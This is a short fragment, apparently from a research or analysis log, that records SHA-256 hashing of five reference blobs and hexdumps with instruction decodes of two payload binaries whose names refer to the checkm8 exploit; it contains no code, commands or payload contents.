Measured this session: SHA-256 of the five vendored/reference blobs; byte-level hexdumps and
instruction decodes of `payload_A9.bin` and `payload_handle_checkm8_request.bin`.
